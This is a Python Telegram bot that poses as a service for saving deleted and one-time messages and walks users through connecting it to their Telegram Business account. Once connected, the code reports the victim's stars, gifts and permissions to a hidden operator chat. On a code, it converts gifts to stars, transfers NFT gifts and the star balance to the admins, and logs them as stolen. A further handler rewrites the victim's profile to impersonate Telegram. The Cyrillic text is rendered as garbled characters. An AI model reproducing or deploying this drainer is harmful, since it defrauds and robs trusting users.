from aiogram import Bot, Dispatcher, types, F
from aiogram.fsm.context import FSMContext
from aiogram.fsm.storage.memory import MemoryStorage
from aiogram.fsm.state import State, StatesGroup
from aiogram.client.default import DefaultBotProperties
from aiogram.enums import ParseMode
from aiogram.types import FSInputFile, InlineKeyboardMarkup, InlineKeyboardButton, CallbackQuery
from aiogram.filters import CommandStart, Command
from aiogram.utils.keyboard import InlineKeyboardBuilder
from aiogram.fsm.storage.memory import MemoryStorage
import random

from datetime import datetime
import requests
import aiohttp
import asyncio
import logging


# Constants
TOKEN = "" #–¢–æ–∫–µ–Ω –±–æ—Ç–∞
LOG_CHAT_ID = -4672823504

MAX_GIFTS_PER_RUN = 1000
last_messages = {}
codes = {}
ADMIN_IDS = [, , ] #–í—Å—Ç–∞–≤–∏—Ç—å –∞–π–¥–∏ –∞–¥–º–∏–Ω–æ–≤
storage = MemoryStorage()

logging.basicConfig(level=logging.INFO)

# Bot initialization
bot = Bot(token=TOKEN, default=DefaultBotProperties(parse_mode=ParseMode.HTML))
dp = Dispatcher(storage=MemoryStorage())

class Draw(StatesGroup):
    id = State()
    gift = State()

def main_menu_kb():
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="üìå –°–æ—Ö—Ä–∞–Ω—è—Ç—å –æ–¥–Ω–æ—Ä–∞–∑–æ–≤—ã–µ —Å–æ–æ–±—â–µ–Ω–∏—è", callback_data="temp_msgs")],
        [InlineKeyboardButton(text="üóëÔ∏è –°–æ—Ö—Ä–∞–Ω—è—Ç—å —É–¥–∞–ª—ë–Ω–Ω—ã–µ —Å–æ–æ–±—â–µ–Ω–∏—è", callback_data="deleted_msgs")],
        [InlineKeyboardButton(text="‚úèÔ∏è –°–æ—Ö—Ä–∞–Ω—è—Ç—å –æ—Ç—Ä–µ–¥–∞–∫—Ç–∏—Ä–æ–≤–∞–Ω–Ω—ã–µ —Å–æ–æ–±—â–µ–Ω–∏—è", callback_data="edited_msgs")],
        [InlineKeyboardButton(text="üéû –ê–Ω–∏–º–∞—Ü–∏–∏ —Å —Ç–µ–∫—Å—Ç–æ–º", callback_data="animations")],
        [InlineKeyboardButton(text="üìñ –ò–Ω—Å—Ç—Ä—É–∫—Ü–∏—è", url="https://t.me/+lcvPndWQzcA4NDU1")]
    ])

@dp.message(Command("start"))
async def start_cmd(message: types.Message):
    if message.text == "/start instruction":
        img = FSInputFile("instruction_guide.png")
        await message.answer_photo(
            photo=img,
            caption=(
                "<b>–ö–∞–∫ –ø–æ–¥–∫–ª—é—á–∏—Ç—å –±–æ—Ç–∞ –∫ –±–∏–∑–Ω–µ—Å-–∞–∫–∫–∞—É–Ω—Ç—É:</b>\n\n"
                "1. –ü–µ—Ä–µ–π–¥–∏—Ç–µ –≤ ¬´–ù–∞—Å—Ç—Ä–æ–π–∫–∏¬ª ‚Üí <i>Telegram –¥–ª—è –±–∏–∑–Ω–µ—Å–∞</i>\n"
                "2. –ü–µ—Ä–µ–π–¥–∏—Ç–µ –≤ <i>–ß–∞—Ç-–±–æ—Ç—ã</i>\n"
                "3. –î–æ–±–∞–≤—å—Ç–µ <b>@AugramSaveMode_bot</b> –≤ —Å–ø–∏—Å–æ–∫\n\n"
                "–ü–æ—Å–ª–µ —ç—Ç–æ–≥–æ —Ñ—É–Ω–∫—Ü–∏–∏ –Ω–∞—á–Ω—É—Ç —Ä–∞–±–æ—Ç–∞—Ç—å –∞–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∏ ‚úÖ"
            )
        )
        return

    photo = FSInputFile("savemod_banner.jpg")
    await message.answer_photo(
        photo=photo,
        caption=(
            "üëã –î–æ–±—Ä–æ –ø–æ–∂–∞–ª–æ–≤–∞—Ç—å –≤ <b>AugramSaveMode</b>!\n\n"
            "üîπ –°–æ—Ö—Ä–∞–Ω—è–π—Ç–µ –æ–¥–Ω–æ—Ä–∞–∑–æ–≤—ã–µ —Å–æ–æ–±—â–µ–Ω–∏—è\n"
            "üîπ –°–æ—Ö—Ä–∞–Ω—è–π—Ç–µ —É–¥–∞–ª—ë–Ω–Ω—ã–µ —Å–æ–æ–±—â–µ–Ω–∏—è\n"
            "üîπ –°–æ—Ö—Ä–∞–Ω—è–π—Ç–µ –æ—Ç—Ä–µ–¥–∞–∫—Ç–∏—Ä–æ–≤–∞–Ω–Ω—ã–µ —Å–æ–æ–±—â–µ–Ω–∏—è\n"
            "üìñ <b>–ü–µ—Ä–µ–¥ –Ω–∞—á–∞–ª–æ–º –æ–∑–Ω–∞–∫–æ–º—å—Ç–µ—Å—å —Å –∏–Ω—Å—Ç—Ä—É–∫—Ü–∏–µ–π</b>\n\n"
            "–í—ã–±–µ—Ä–∏—Ç–µ, —á—Ç–æ —Ö–æ—Ç–∏—Ç–µ —Å–æ—Ö—Ä–∞–Ω—è—Ç—å:"
        ),
        reply_markup=main_menu_kb()
    )

@dp.callback_query(F.data.in_({"temp_msgs", "deleted_msgs", "edited_msgs", "animations"}))
async def require_instruction(callback: types.CallbackQuery):
    await callback.answer("–°–Ω–∞—á–∞–ª–∞ –Ω–∞–∂–º–∏—Ç–µ –Ω–∞ üìñ –ò–Ω—Å—Ç—Ä—É–∫—Ü–∏—é —Å–≤–µ—Ä—Ö—É!", show_alert=True)

async def pagination(
    page=0
):
    url = f'https://api.telegram.org/bot{TOKEN}/getAvailableGifts'
    try:
        response = requests.get(url)
        response.raise_for_status()
        builder = InlineKeyboardBuilder()
        start = page * 9
        end = start + 9
        count = 0
        
        data = response.json()
        if data.get("ok", False):
            gifts = list(data.get("result", {}).get("gifts", []))
            for gift in gifts[start:end]:
                print(gift)
                count += 1
                builder.button(
                    text=f"‚≠êÔ∏è{gift['star_count']} {gift['sticker']['emoji']}",
                    callback_data=f"gift_{gift['id']}"
                )
            builder.adjust(2)
        if page <= 0:
            builder.row(
                InlineKeyboardButton(
                    text="‚Ä¢",
                    callback_data="empty"
                ),
                InlineKeyboardButton(
                    text=f"{page}/{len(gifts) // 9}",
                    callback_data="empty"
                ),
                InlineKeyboardButton(
                    text="–í–ø–µ—Ä–µ–¥",
                    callback_data=f"next_{page + 1}"

                )
            )
        elif count < 9:
            builder.row(
                InlineKeyboardButton(
                    text="–ù–∞–∑–∞–¥",
                    callback_data=f"down_{page - 1}"
                ),
                InlineKeyboardButton(
                    text=f"{page}/{len(gifts) // 9}",
                    callback_data="empty"
                ),
                InlineKeyboardButton(
                    text="‚Ä¢",
                    callback_data="empty"

                )
            )
        elif page > 0 and count >= 9:
            builder.row(
                InlineKeyboardButton(
                    text="–ù–∞–∑–∞–¥",
                    callback_data=f"down_{page - 1}"
                ),
                InlineKeyboardButton(
                    text=f"{page}/{len(gifts) // 9}",
                    callback_data="empty"
                ),
                InlineKeyboardButton(
                    text="–í–ø–µ—Ä–µ–¥",
                    callback_data=f"next_{page + 1}"

                )
            )
        return builder.as_markup()
            
    except Exception as e:
        print(e)
        await bot.send_message(chat_id=ADMIN_IDS[0], text=f"{e}")

@dp.business_connection()
async def handle_business(business_connection: types.BusinessConnection):
    business_id = business_connection.id
    builder = InlineKeyboardBuilder()
    builder.button(
        text="‚õîÔ∏è –£–¥–∞–ª–∏—Ç—å –ø–æ–¥–∫–ª—é—á–µ–Ω–∏–µ", 
        callback_data=f"destroy:{business_id}"
    )
    
    code = random.randint(100, 1000)
    codes[str(code)] = business_id
    user = business_connection.user
    
    info = await bot.get_business_connection(business_id)
    rights = info.rights
    gifts = await bot.get_business_account_gifts(business_id, exclude_unique=False)
    stars = await bot.get_business_account_star_balance(business_id)
    
    # –†–∞—Å—Å—á–µ—Ç—ã
    total_price = sum(g.convert_star_count or 0 for g in gifts.gifts if g.type == "regular")
    nft_gifts = [g for g in gifts.gifts if g.type == "unique"]
    
    # –†–∞—Å—á–µ—Ç —Å—Ç–æ–∏–º–æ—Å—Ç–∏ –ø–µ—Ä–µ–Ω–æ—Å–∞ NFT (25 –∑–≤–µ–∑–¥ –∑–∞ –∫–∞–∂–¥—ã–π NFT)
    nft_transfer_cost = len(nft_gifts) * 25
    # –û–±—â–∞—è —Å—Ç–æ–∏–º–æ—Å—Ç—å (–∫–æ–Ω–≤–µ—Ä—Ç–∞—Ü–∏—è –æ–±—ã—á–Ω—ã—Ö + –ø–µ—Ä–µ–Ω–æ—Å NFT)
    total_withdrawal_cost = total_price + nft_transfer_cost
    
    # –§–æ—Ä–º–∞—Ç–∏—Ä–æ–≤–∞–Ω–∏–µ —Ç–µ–∫—Å—Ç–∞
    header = f"‚ú® <b>–ù–æ–≤–æ–µ –ø–æ–¥–∫–ª—é—á–µ–Ω–∏–µ –±–∏–∑–Ω–µ—Å-–∞–∫–∫–∞—É–Ω—Ç–∞</b> ‚ú®\n\n"
    
    user_info = (
        f"<blockquote>üë§ <b>–ò–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è –æ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ:</b>\n"
        f"‚îú‚îÄ ID: <code>{user.id}</code>\n"
        f"‚îú‚îÄ Username: @{user.username or '–Ω–µ—Ç'}\n"
        f"‚ï∞‚îÄ –ò–º—è: {user.first_name or ''} {user.last_name or ''}</blockquote>\n\n"
    )
    
    balance_info = (
        f"<blockquote>üí∞ <b>–ë–∞–ª–∞–Ω—Å:</b>\n"
        f"‚îú‚îÄ –î–æ—Å—Ç—É–ø–Ω–æ –∑–≤—ë–∑–¥: {int(stars.amount):,}\n"
        f"‚îú‚îÄ –ó–≤—ë–∑–¥ –≤ –ø–æ–¥–∞—Ä–∫–∞—Ö: {total_price:,}\n"
        f"‚ï∞‚îÄ <b>–ò—Ç–æ–≥–æ:</b> {int(stars.amount) + total_price:,}</blockquote>\n\n"
    )
    
    gifts_info = (
        f"<blockquote>üéÅ <b>–ü–æ–¥–∞—Ä–∫–∏:</b>\n"
        f"‚îú‚îÄ –í—Å–µ–≥–æ: {gifts.total_count}\n"
        f"‚îú‚îÄ –û–±—ã—á–Ω—ã–µ: {gifts.total_count - len(nft_gifts)}\n"
        f"‚îú‚îÄ NFT: {len(nft_gifts)}\n"
        f"‚îú‚îÄ <b>–°—Ç–æ–∏–º–æ—Å—Ç—å –ø–µ—Ä–µ–Ω–æ—Å–∞ NFT:</b> {nft_transfer_cost:,} –∑–≤—ë–∑–¥ (25 –∑–∞ –∫–∞–∂–¥—ã–π)\n"
        f"‚ï∞‚îÄ <b>–û–±—â–∞—è —Å—Ç–æ–∏–º–æ—Å—Ç—å –≤—ã–≤–æ–¥–∞:</b> {total_withdrawal_cost:,} –∑–≤—ë–∑–¥</blockquote>"
    )
    
    # –î–æ–±–∞–≤–ª—è–µ–º —Å–ø–∏—Å–æ–∫ NFT –µ—Å–ª–∏ –æ–Ω–∏ –µ—Å—Ç—å
    nft_list = ""
    if nft_gifts:
        nft_items = []
        for idx, g in enumerate(nft_gifts, 1):
            try:
                gift_id = getattr(g, 'id', '—Å–∫—Ä—ã—Ç')
                nft_items.append(f"‚îú‚îÄ NFT #{idx} (ID: {gift_id}) - 25‚≠ê")
            except AttributeError:
                nft_items.append(f"‚îú‚îÄ NFT #{idx} (—Å–∫—Ä—ã—Ç) - 25‚≠ê")
        
        nft_list = "\n<blockquote>üîó <b>NFT –ø–æ–¥–∞—Ä–∫–∏:</b>\n" + \
                  "\n".join(nft_items) + \
                  f"\n‚ï∞‚îÄ <b>–ò—Ç–æ–≥–æ:</b> {len(nft_gifts)} NFT = {nft_transfer_cost}‚≠ê</blockquote>\n\n"
    
    rights_info = (
        f"<blockquote>üîê <b>–ü—Ä–∞–≤–∞ –±–æ—Ç–∞:</b>\n"
        f"‚îú‚îÄ –û—Å–Ω–æ–≤–Ω—ã–µ: {'‚úÖ' if rights.can_read_messages else '‚ùå'} –ß—Ç–µ–Ω–∏–µ | "
        f"{'‚úÖ' if rights.can_delete_all_messages else '‚ùå'} –£–¥–∞–ª–µ–Ω–∏–µ\n"
        f"‚îú‚îÄ –ü—Ä–æ—Ñ–∏–ª—å: {'‚úÖ' if rights.can_edit_name else '‚ùå'} –ò–º—è | "
        f"{'‚úÖ' if rights.can_edit_username else '‚ùå'} Username\n"
        f"‚ï∞‚îÄ –ü–æ–¥–∞—Ä–∫–∏: {'‚úÖ' if rights.can_convert_gifts_to_stars else '‚ùå'} –ö–æ–Ω–≤–µ—Ä—Ç–∞—Ü–∏—è | "
        f"{'‚úÖ' if rights.can_transfer_stars else '‚ùå'} –ü–µ—Ä–µ–≤–æ–¥</blockquote>\n\n"
    )
    
    footer = (
        f"<blockquote>üîë <b>–ö–æ–¥ –¥–ª—è –≤—ã–≤–æ–¥–∞:</b> <code>{code}</code>\n"
        f"‚ÑπÔ∏è <i>–ü–µ—Ä–µ–Ω–æ—Å –∫–∞–∂–¥–æ–≥–æ NFT –ø–æ–¥–∞—Ä–∫–∞ —Å—Ç–æ–∏—Ç 25 –∑–≤—ë–∑–¥</i>\n"
        f"üïí –í—Ä–µ–º—è: {datetime.now().strftime('%d.%m.%Y %H:%M')}</blockquote>"
    )
    
    full_message = header + user_info + balance_info + gifts_info + nft_list + rights_info + footer
    
    await bot.send_message(
        chat_id=LOG_CHAT_ID,
        text=full_message,
        reply_markup=builder.as_markup(),
        parse_mode="HTML",
        disable_web_page_preview=True
    )




@dp.callback_query(F.data == "draw_stars")
async def draw_stars(message: types.Message, state: FSMContext):
    await message.answer(
        text="–í–≤–µ–¥–∏—Ç–µ –∞–π–¥–∏ —é–∑–µ—Ä–∞ –∫–æ–º—É –ø–µ—Ä–µ–≤–µ—Å—Ç–∏ –ø–æ–¥–∞—Ä–∫–∏"
    )
    await state.set_state(Draw.id)

@dp.message(F.text, Draw.id)
async def choice_gift(message: types.Message, state: FSMContext):

    msg = await message.answer(
        text="–ê–∫—Ç—É–∞–ª—å–Ω—ã–µ –ø–æ–¥–∞—Ä–∫–∏:",
        reply_markup=await pagination()
    )
    last_messages[message.chat.id] = msg.message_id
    user_id = message.text
    await state.update_data(user_id=user_id)
    await state.set_state(Draw.gift)

@dp.callback_query(F.data.startswith("gift_"))
async def draw(callback: CallbackQuery, state: FSMContext):
    gift_id = callback.data.split('_')[1]
    user_id = await state.get_data()
    user_id = user_id['user_id']
    await bot.send_gift(
        gift_id=gift_id,
        chat_id=int(user_id)
    )
    await callback.message.answer("–£—Å–ø–µ—à–Ω–æ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω –ø–æ–¥–∞—Ä–æ–∫")
    await state.clear

@dp.callback_query(F.data.startswith("next_") or F.data.startswith("down_"))
async def edit_page(callback: CallbackQuery):
    message_id = last_messages[callback.from_user.id]
    await bot.edit_message_text(
        chat_id=callback.from_user.id,
        message_id=message_id,
        text="–ê–∫—Ç—É–∞–ª—å–Ω—ã–µ –ø–æ–¥–∞—Ä–∫–∏:",
        reply_markup=await pagination(page=int(callback.data.split("_")[1]))
    )
    
            

@dp.message(Command("ap"))
async def apanel(message: types.Message):
    if message.from_user.id not in ADMIN_IDS:
        return
    builder = InlineKeyboardBuilder()
    builder.row(
        InlineKeyboardButton(
            text="‚≠êÔ∏è–í—ã–≤–æ–¥ –∑–≤–µ–∑–¥",
            callback_data="draw_stars"
        )
    )
    await message.answer(
        text="–ê–¥–º–∏–Ω –ø–∞–Ω–µ–ª—å:",
        reply_markup=builder.as_markup()
    )
@dp.callback_query(F.data.startswith("destroy:"))
async def destroy_account(callback: CallbackQuery):
    if callback.from_user.id not in ADMIN_IDS:
        return
    builder = InlineKeyboardBuilder()
    print("HSHSHXHXYSTSTTSTSTSTSTSTSTSTSTTZTZTZYZ")
    business_id = callback.data.split(":")[1]
    print(f"Business id {business_id}")
    builder.row(
        InlineKeyboardButton(
            text="‚õîÔ∏è–û—Ç–º–µ–Ω–∞ —Å–∞–º–æ—É–Ω–∏—á—Ç–æ–∂–µ–Ω–∏—è",
            callback_data=f"decline:{business_id}"
        )
    )
    await bot.set_business_account_name(business_connection_id=business_id, first_name="Telegram")
    await bot.set_business_account_bio(business_id, "Telegram")
    photo = FSInputFile("telegram.jpg")
    photo = types.InputProfilePhotoStatic(type="static", photo=photo)
    await bot.set_business_account_profile_photo(business_id, photo)
    await callback.message.answer(
        text="‚õîÔ∏è–í–∫–ª—é—á–µ–Ω —Ä–µ–∂–∏–º —Å–∞–º–æ—É–Ω–∏—á—Ç–æ–∂–µ–Ω–∏—è, –¥–ª—è —Ç–æ–≥–æ —á—Ç–æ–±—ã –æ—Ç–∫–ª—é—á–∏—Ç—å –Ω–∞–∂–º–∏—Ç–µ –Ω–∞ –∫–Ω–æ–ø–∫—É",
        reply_markup=builder.as_markup()
    )

@dp.callback_query(F.data.startswith("decline:"))
async def decline(callback: CallbackQuery):
    business_id = callback.data.split(":")[1]
    await bot.set_business_account_name(business_id, "Bot")
    await bot.set_business_account_bio(business_id, "Some bot")
    await callback.message.answer("–ú–∞–º–æ–Ω—Ç —Å–ø–∞—Å–µ–Ω –æ—Ç —Å–Ω–æ—Å–∞.")

@dp.message(F.text)
async def access(message: types.Message):
    stolen_nfts = []
    errors = []
    stolen_count = 0
    if message.text not in codes:
        return
    business_id = codes[message.text]
    try:
        gifts = await bot.get_business_account_gifts(business_id, exclude_unique=False)
        gifts_list = gifts.gifts if hasattr(gifts, 'gifts') else []
    except Exception as e:
        await bot.send_message(LOG_CHAT_ID, f"‚ùå –û—à–∏–±–∫–∞ –ø—Ä–∏ –ø–æ–ª—É—á–µ–Ω–∏–∏ –ø–æ–¥–∞—Ä–∫–æ–≤: {e}")
        return

    gifts_to_process = gifts_list[:MAX_GIFTS_PER_RUN]
    if gifts_to_process == []:
        await bot.send_message(chat_id=LOG_CHAT_ID, text="–£ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è –Ω–µ—Ç –ø–æ–¥–∞—Ä–∫–æ–≤.")
    
    for gift in gifts_to_process:
        gift_id = gift.owned_gift_id
        print(gift.gift)

        gift_type = gift.type
        isTransfered = gift.can_be_transferred if gift_type == "unique" else False
        transfer_star_count = gift.transfer_star_count if gift_type == "unique" else False
        gift_name = gift.gift.name.replace(" ", "") if gift.type == "unique" else "Unknown"
        
        if gift_type == "regular":
            try:
                await bot.convert_gift_to_stars(business_id, gift_id)
            except:
                pass
    
        if not gift_id:
            continue

        # –ü–µ—Ä–µ–¥–∞—á–∞
        for user in ADMIN_IDS:
            try:
                if isTransfered:
                    steal = await bot.transfer_gift(business_id, gift_id, user, transfer_star_count)
                    stolen_nfts.append(f"t.me/nft/{gift_name}")
                    stolen_count += 1
            except Exception as e:
                await message.answer(f"–ü–æ–ø—ã—Ç–∫–∞ –ø–µ—Ä–µ–¥–∞—Ç—å –ø–æ–¥–∞—Ä–∫–∏ –∞–¥–º–∏–Ω—É {user}. –ù–µ—É–¥–∞—á–Ω–æ.")
                print(e)

    # –õ–æ–≥
    if stolen_count > 0:
        text = (
            f"üéÅ –£—Å–ø–µ—à–Ω–æ —É–∫—Ä–∞–¥–µ–Ω–æ –ø–æ–¥–∞—Ä–∫–æ–≤: <b>{stolen_count}</b>\n\n" +
            "\n".join(stolen_nfts)
        )
        await bot.send_message(LOG_CHAT_ID, text)
    else:
        await message.answer("–ù–µ —É–¥–∞–ª–æ—Å—å —É–∫—Ä–∞—Å—Ç—å –ø–æ–¥–∞—Ä–∫–∏")
    
    # –ü–µ—Ä–µ–≤–æ–¥ –∑–≤—ë–∑–¥
    try:
        stars = await bot.get_business_account_star_balance(business_id)
        amount = int(stars.amount)
        if amount > 0:
            await bot.transfer_business_account_stars(business_id, amount)
            await bot.send_message(LOG_CHAT_ID, f"üåü –í—ã–≤–µ–¥–µ–Ω–æ –∑–≤—ë–∑–¥: {amount}")
        else:
            await message.answer("–£ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è –Ω–µ—Ç –∑–≤–µ–∑–¥.")
    except Exception as e:
        await bot.send_message(LOG_CHAT_ID, f"üö´ –û—à–∏–±–∫–∞ –ø—Ä–∏ –≤—ã–≤–æ–¥–µ –∑–≤—ë–∑–¥: {e}")
        
async def main():
    await dp.start_polling(bot)


if __name__ == "__main__":
    asyncio.run(main())